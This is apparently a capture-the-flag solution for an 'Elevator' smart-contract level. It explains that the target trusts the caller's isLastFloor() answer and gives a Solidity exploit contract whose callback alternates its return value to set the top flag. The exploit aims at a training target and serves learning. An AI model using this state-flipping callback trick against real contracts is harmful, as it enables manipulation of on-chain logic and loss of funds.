# Answer

Goal: Set `top` value to be true.

## 1. Changing top value

The contract expects the msg.sender to be an honest Building implementation, but by manipulating `isLastFloor()` function we can force Elevator think we are at the top floor.

```solidity
interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract ElevatorExploit is Building {
    Elevator e;
    bool flipBool = true;

    constructor(address targetAddr) {
        e = Elevator(targetAddr);
    }

    // Provided floor value doesn't matter
    function isLastFloor(uint256) external override returns (bool) {
        flipBool = !flipBool;
        return flipBool;
    }

    function exploit() external {
        e.goTo(0);
    }
}

```
